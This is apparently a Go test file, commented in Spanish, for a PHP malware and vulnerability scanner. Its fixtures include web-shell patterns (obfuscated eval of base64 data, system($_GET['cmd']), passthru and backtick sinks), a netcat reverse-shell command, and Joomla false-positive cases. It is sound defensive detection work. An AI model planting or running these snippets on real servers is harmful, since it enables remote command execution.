package codescan

import (
	"encoding/json"
	"testing"
)

type obsLike struct {
	subject   string
	construct string
	trigger   string
	line      int
	via       string
}

func run(t *testing.T, code string) []obsLike {
	t.Helper()
	raw := Scan("a.php", []byte(code), 1)
	var out []obsLike
	for _, o := range raw {
		var ev map[string]any
		_ = json.Unmarshal([]byte(o.EvidenceJSON), &ev)
		via, _ := ev["via"].(string)
		out = append(out, obsLike{o.SubjectDisplay, ev["construct"].(string), ev["trigger"].(string), int(ev["line"].(float64)), via})
	}
	return out
}

func TestCode001ObfuscatedEval(t *testing.T) {
	// El código PHP es un literal de texto: nunca se ejecuta, solo se
	// tokeniza como dato (Principio IX). "eval" aquí es la cadena que el
	// detector debe reconocer, no una llamada real.
	pos := run(t, "<?php eval(gzinflate(base64_decode('AAAA')));")
	if len(pos) != 1 || pos[0].construct != "obfuscated_eval" {
		t.Fatalf("positivo: %v", pos)
	}
	// Negativo: decode sin ejecución.
	if neg := run(t, "<?php $d = base64_decode($x); echo $d;"); len(neg) != 0 {
		t.Fatalf("base64_decode suelto no debe disparar: %v", neg)
	}
	// Negativo: nombre en comentario.
	if neg := run(t, "<?php // eval(base64_decode('x'))\n$y=1;"); len(neg) != 0 {
		t.Fatalf("comentario no debe disparar: %v", neg)
	}
}

func TestCode002InputToSink(t *testing.T) {
	for _, code := range []string{
		"<?php system($_GET['cmd']);",
		"<?php eval($_POST['x']);",
		"<?php passthru($_REQUEST['c']);",
		"<?php `$_GET[c]`;",
		"<?php eval(file_get_contents('php://input'));",
	} {
		obs := run(t, code)
		found := false
		for _, o := range obs {
			if o.construct == "input_to_sink" {
				found = true
			}
		}
		if !found {
			t.Fatalf("no disparó input_to_sink: %q → %v", code, obs)
		}
	}
	// Negativos.
	for _, code := range []string{
		"<?php echo $_GET['q'];",                 // superglobal sin sink
		"<?php system('/usr/bin/legit --flag');", // sink con literal
		"<?php $o->system($_GET['x']);",          // método, no función global
	} {
		if obs := run(t, code); len(obs) != 0 {
			t.Fatalf("falso positivo en %q → %v", code, obs)
		}
	}
}

func TestCode002BacktickBoundary(t *testing.T) {
	// $_GETTER no es $_GET: el chequeo de frontera (isIdentByte) debe evitar
	// el falso positivo.
	if obs := run(t, "<?php `$_GETTER[x]`;"); len(obs) != 0 {
		t.Fatalf("$_GETTER no debe casar con $_GET: %v", obs)
	}
}

func TestCode003PregE(t *testing.T) {
	if obs := run(t, "<?php preg_replace('/.*/e', $_POST['x'], $s);"); len(obs) == 0 || !has(obs, "preg_e") {
		t.Fatalf("no disparó preg_e: %v", obs)
	}
	// Delimitador espejo: '(' abre, ')' cierra.
	if obs := run(t, "<?php preg_replace('(a)e', $_POST['x'], $s);"); len(obs) == 0 || !has(obs, "preg_e") {
		t.Fatalf("no disparó preg_e con delimitador espejo: %v", obs)
	}
	// Negativos.
	for _, code := range []string{
		"<?php preg_replace('/foo/i', 'bar', $s);",
		"<?php preg_replace('#a#', 'b', $s);",
	} {
		if obs := run(t, code); has(obs, "preg_e") {
			t.Fatalf("falso positivo /e en %q → %v", code, obs)
		}
	}
}

func has(obs []obsLike, construct string) bool {
	for _, o := range obs {
		if o.construct == construct {
			return true
		}
	}
	return false
}

func TestDataflowDynamicCall(t *testing.T) {
	// Positivo: nombre de función decodificado, invocado.
	obs := run(t, "<?php $g = base64_decode('c3lzdGVt'); $g($_POST['x']);")
	if !hasVia(obs, "dynamic_call", "dataflow") {
		t.Fatalf("no disparó dynamic_call: %v", obs)
	}
	// Positivo: nombre por concatenación de literales.
	obs = run(t, "<?php $f = 'sys'.'tem'; $f('id');")
	if !hasVia(obs, "dynamic_call", "dataflow") {
		t.Fatalf("no disparó dynamic_call (concat): %v", obs)
	}
	// Negativos.
	for _, code := range []string{
		"<?php $f = 'strlen'; $f($_GET['x']);",    // literal estático benigno
		"<?php $a = $b.$c; $a('x');",              // concat de solo variables
		"<?php $g = base64_decode('x'); echo $g;", // decoded pero no invocado
	} {
		if hasVia(run(t, code), "dynamic_call", "dataflow") {
			t.Fatalf("falso positivo en %q", code)
		}
	}
}

// TestDataflowFPFixesPreserveRecall pin-fija que los arreglos de FP de
// TestDataflowRealSiteFalsePositives se hicieron ACOTANDO la condición de
// exclusión, no el shape de la coincidencia: cada patrón real que el fix
// pudo haber matado por error (recall) debe seguir disparando, y cada FP
// original debe seguir sin disparar (revisión de código, Principio VI: un FP
// cambiado por un FN trivial no es una ganancia neta).
func TestDataflowFPFixesPreserveRecall(t *testing.T) {
	// --- concatWithLiteral: decode fragmentado + literal ---
	// MUST fire: fragmento decodificado concatenado con un literal como
	// nombre de función (evasión real: decode partido en dos asignaciones).
	if obs := run(t, "<?php $part = base64_decode('c3lz'); $fn = $part.'tem'; $fn($_GET['x']);"); !hasVia(obs, "dynamic_call", "dataflow") {
		t.Fatalf("decode+literal: no disparó dynamic_call (recall perdido): %v", obs)
	}
	// MUST still fire: concatenación toda-literal clásica.
	if obs := run(t, "<?php $f = 'sys'.'tem'; $f('id');"); !hasVia(obs, "dynamic_call", "dataflow") {
		t.Fatalf("toda-literal: no disparó dynamic_call: %v", obs)
	}
	// MUST still NOT fire (el FP real de RouterLegacy): variable plana (NO
	// decodificada, NO superglobal) concatenada con literales.
	if obs := run(t, "<?php $func = 'get'.$name.'Route'; if (function_exists($func)) { $func(); }"); hasVia(obs, "dynamic_call", "dataflow") {
		t.Fatalf("var plana en concat: falso positivo reintroducido: %v", obs)
	}

	// --- decodedVarIn: paréntesis redundantes alrededor de la var desnuda ---
	// MUST fire again: paréntesis redundantes ((...)) no deben blindar la
	// evasión trivial.
	if obs := run(t, "<?php $f = base64_decode('AAAA'); eval(($f));"); !hasVia(obs, "obfuscated_eval", "dataflow") {
		t.Fatalf("paréntesis redundantes: no disparó obfuscated_eval (recall perdido): %v", obs)
	}
	// MUST still fire: uso desnudo sin paréntesis, en eval y en assert.
	if obs := run(t, "<?php $f = base64_decode('AAAA'); eval($f);"); !hasVia(obs, "obfuscated_eval", "dataflow") {
		t.Fatalf("desnudo eval: no disparó obfuscated_eval: %v", obs)
	}
	if obs := run(t, "<?php $f = base64_decode('AAAA'); assert($f);"); !hasVia(obs, "obfuscated_eval", "dataflow") {
		t.Fatalf("desnudo assert: no disparó obfuscated_eval: %v", obs)
	}
	// MUST still NOT fire (los FP reales de brick/math y lcobucci/jwt):
	// comprobación booleana sobre el resultado del decode.
	if obs := run(t, "<?php $v = hex2bin($x); assert($v !== false);"); hasVia(obs, "obfuscated_eval", "dataflow") {
		t.Fatalf("assert comparación: falso positivo reintroducido: %v", obs)
	}
	if obs := run(t, "<?php $v = hex2bin($x); assert(is_string($v));"); hasVia(obs, "obfuscated_eval", "dataflow") {
		t.Fatalf("assert envuelto en is_string: falso positivo reintroducido: %v", obs)
	}
}

// TestDataflowRealSiteFalsePositives fija tres falsos positivos hallados al
// validar contra el sitio real (Joomla 5.4.7, 8172 PHP, Principio VI): cada
// uno reproduce el patrón exacto de código Joomla core que disparaba antes
// del ajuste del modelo (Task 3 del incremento dataflow-detectors).
func TestDataflowRealSiteFalsePositives(t *testing.T) {
	cases := map[string]string{
		"new $v(...) instancia clase, no llama función (Factory.php, DatabaseFactory.php)": `<?php
			$name = 'JConfig' . $namespace;
			if (class_exists($name)) { $config = new $name(); }`,
		"concat de propiedad+literal es despacho convencional, no ofuscación (RouterLegacy::build)": `<?php
			$function = $this->component . 'BuildRoute';
			if (function_exists($function)) { $segments = $function($query); }`,
		"assert(comparación) sobre un decode es una comprobación booleana, no ejecución (BigInteger::toBytes)": `<?php
			$bin = hex2bin($hex);
			assert($bin !== false);`,
		"assert(is_string(...)) envuelve el decodificado, no lo ejecuta desnudo (MultibyteStringConverter)": `<?php
			$asn1 = hex2bin($x);
			assert(is_string($asn1));`,
	}
	for name, code := range cases {
		if obs := run(t, code); len(obs) != 0 {
			t.Fatalf("%s: falso positivo → %v", name, obs)
		}
	}
}

// TestDataflowScopeLeakOnFunctionExit cubre el FP de fuga de ámbito: el
// reinicio de `vars` ocurría solo al ENTRAR en una declaración con nombre,
// nunca al SALIR de su cuerpo, así que un hecho fijado dentro de la función
// sobrevivía al `}` de cierre y contaminaba el código top-level siguiente
// (una variable de igual nombre pero de OTRO ámbito). Hallado en ficheros de
// extensiones de terceros con funciones seguidas de sentencias top-level.
func TestDataflowScopeLeakOnFunctionExit(t *testing.T) {
	// MUST NOT fire: $x tainted dentro de foo() no debe sobrevivir al cierre
	// de su cuerpo y contaminar el $x top-level (variable distinta).
	if obs := run(t, "<?php function foo() { $x = $_GET['id']; } system($x);"); has(obs, "input_to_sink") {
		t.Fatalf("fuga de ámbito (tainted): falso positivo → %v", obs)
	}
	// MUST NOT fire: mismo bug con el hecho decoded hacia un eval top-level.
	if obs := run(t, "<?php function bar() { $c = base64_decode('x'); } eval($c);"); has(obs, "obfuscated_eval") {
		t.Fatalf("fuga de ámbito (decoded): falso positivo → %v", obs)
	}
	// Control: la closure sigue sin romperse (no debe reiniciar el ámbito).
	if obs := run(t, "<?php $x = $_GET['c']; $g = function(){ return 1; }; system($x);"); !has(obs, "input_to_sink") {
		t.Fatalf("closure: no debe reiniciar el ámbito (recall perdido): %v", obs)
	}
	// Control: la detección DENTRO de la función sigue intacta.
	if obs := run(t, "<?php function baz() { $x = $_GET['c']; system($x); }"); !has(obs, "input_to_sink") {
		t.Fatalf("detección dentro de la función: recall perdido: %v", obs)
	}
	// Control: el aislamiento entre dos funciones nombradas sigue funcionando.
	if obs := run(t, "<?php function a(){ $x = $_GET['c']; } function b(){ system($x); }"); len(obs) != 0 {
		t.Fatalf("aislamiento entre funciones: falso positivo → %v", obs)
	}
}

// hasVia: helper de test; añádelo si no existe.
func hasVia(obs []obsLike, construct, via string) bool {
	for _, o := range obs {
		if o.construct == construct && o.via == via {
			return true
		}
	}
	return false
}

// TestCode002EscapeshellExemption cubre el hallazgo 1(b): una superglobal
// saneada con escapeshellarg()/escapeshellcmd() no dispara, pero una
// superglobal fuera de esa envoltura (en el mismo primer argumento) sí.
func TestCode002EscapeshellExemption(t *testing.T) {
	if obs := run(t, "<?php system(escapeshellarg($_GET['cmd']));"); has(obs, "input_to_sink") {
		t.Fatalf("superglobal saneada con escapeshellarg no debe disparar: %v", obs)
	}
	if obs := run(t, "<?php system(escapeshellcmd($_GET['cmd']));"); has(obs, "input_to_sink") {
		t.Fatalf("superglobal saneada con escapeshellcmd no debe disparar: %v", obs)
	}
	if obs := run(t, "<?php system(escapeshellarg($_GET['a']) . $_GET['b']);"); !has(obs, "input_to_sink") {
		t.Fatalf("superglobal fuera de escapeshellarg en el mismo arg 1 debe disparar: %v", obs)
	}
}

// TestCode002FirstArgumentOnly cubre el hallazgo 1(a): la superglobal solo
// cuenta si aparece en el primer argumento (comando/código) del sink, no en
// argumentos posteriores (p.ej. el entorno de proc_open).
func TestCode002FirstArgumentOnly(t *testing.T) {
	if obs := run(t, "<?php proc_open('/bin/ls', $d, $p, '/tmp', $_SERVER);"); has(obs, "input_to_sink") {
		t.Fatalf("$_SERVER en un argumento posterior de proc_open no debe disparar: %v", obs)
	}
	if obs := run(t, "<?php proc_open($_GET['cmd'], $d, $p);"); !has(obs, "input_to_sink") {
		t.Fatalf("$_GET en el primer argumento de proc_open debe disparar: %v", obs)
	}
}

func TestCode002BacktickLeftmostDeterministic(t *testing.T) {
	// Un backtick con dos superglobales distintas debe disparar una sola vez,
	// con el trigger igual a la que aparece más a la izquierda en el texto
	// ("$_server", antes que "$_get"). Debe ser estable en repetidas
	// ejecuciones (Principio IV): no puede depender del orden de iteración de
	// un mapa.
	code := "<?php `nc -e /bin/sh $_SERVER[REMOTE_ADDR] $_GET[port]`;"
	for i := 0; i < 20; i++ {
		obs := run(t, code)
		if len(obs) != 1 || obs[0].construct != "input_to_sink" {
			t.Fatalf("esperaba una sola observación input_to_sink: %v", obs)
		}
		if obs[0].trigger != "$_server" {
			t.Fatalf("trigger esperado $_server (más a la izquierda), obtenido %q (run %d)", obs[0].trigger, i)
		}
	}
}

func TestDataflowSinkDetectors(t *testing.T) {
	// Los literales PHP de este test (incluido "eval(...)") son datos de
	// fixture tokenizados por Scan; nunca se ejecutan (Principio IX).
	// Positivos: la forma partida dispara, con via=dataflow.
	pos := map[string]string{
		"decode partido":  "<?php $f = gzinflate(base64_decode('AAAA')); eval($f);",
		"entrada partida": "<?php $x = $_GET['cmd']; system($x);",
	}
	wantConstruct := map[string]string{"decode partido": "obfuscated_eval", "entrada partida": "input_to_sink"}
	for name, code := range pos {
		obs := run(t, code)
		found := false
		for _, o := range obs {
			if o.construct == wantConstruct[name] && o.via == "dataflow" {
				found = true
			}
		}
		if !found {
			t.Fatalf("%s: no disparó via dataflow: %v", name, obs)
		}
	}
	// Negativos: no debe disparar.
	neg := []string{
		"<?php $x = $_GET['c']; $x = escapeshellarg($x); system($x);",        // saneo limpia
		"<?php $x = $_GET['c']; $x = 5; system($x);",                         // reasignación limpia
		"<?php $d = base64_decode($cfg); echo $d;",                           // decoded sin sink
		"<?php function a(){ $x = $_GET['c']; } function b(){ system($x); }", // ámbitos distintos
	}
	for _, code := range neg {
		if obs := run(t, code); len(obs) != 0 {
			t.Fatalf("falso positivo en %q → %v", code, obs)
		}
	}
	// v1 inline sigue vivo (via vacío).
	obs := run(t, "<?php system($_GET['cmd']);")
	if len(obs) != 1 || obs[0].construct != "input_to_sink" || obs[0].via != "" {
		t.Fatalf("inline v1 regresionó: %v", obs)
	}
}

// TestDataflowClosureDoesNotWipeScope cubre el bug crítico de la ronda 1 de
// revisión: el reinicio de ámbito por `function` disparaba también para
// expresiones closure (`function(){...}` asignada a una variable o pasada
// como argumento), borrando silenciosamente todo `vars` para el resto del
// archivo y desactivando ambos detectores de dataflow. Solo una DECLARACIÓN
// con nombre (`function foo(...)`) debe reiniciar el ámbito.
func TestDataflowClosureDoesNotWipeScope(t *testing.T) {
	// Closure asignada a variable: no debe borrar el taint de $x.
	if obs := run(t, "<?php $x = $_GET['c']; $g = function(){ return 1; }; system($x);"); !has(obs, "input_to_sink") {
		t.Fatalf("closure anónima asignada a variable no debe borrar el ámbito: %v", obs)
	}
	// Closure pasada como argumento de una llamada (p.ej. usort): tampoco.
	if obs := run(t, "<?php $x = $_GET['c']; usort($arr, function($p,$q){ return 0; }); system($x);"); !has(obs, "input_to_sink") {
		t.Fatalf("closure como argumento de llamada no debe borrar el ámbito: %v", obs)
	}
	// Control: una declaración con nombre real SÍ sigue aislando ámbitos.
	if obs := run(t, "<?php function a(){ $x = $_GET['c']; } function b(){ system($x); }"); len(obs) != 0 {
		t.Fatalf("declaración con nombre debe seguir aislando ámbitos: %v", obs)
	}
	// Control: retorno por referencia (`function &foo(...)`) también es
	// declaración con nombre y debe reiniciar el ámbito.
	if obs := run(t, "<?php function &a(){ $x = $_GET['c']; } function b(){ system($x); }"); len(obs) != 0 {
		t.Fatalf("declaración con nombre y retorno por referencia debe seguir aislando ámbitos: %v", obs)
	}
}
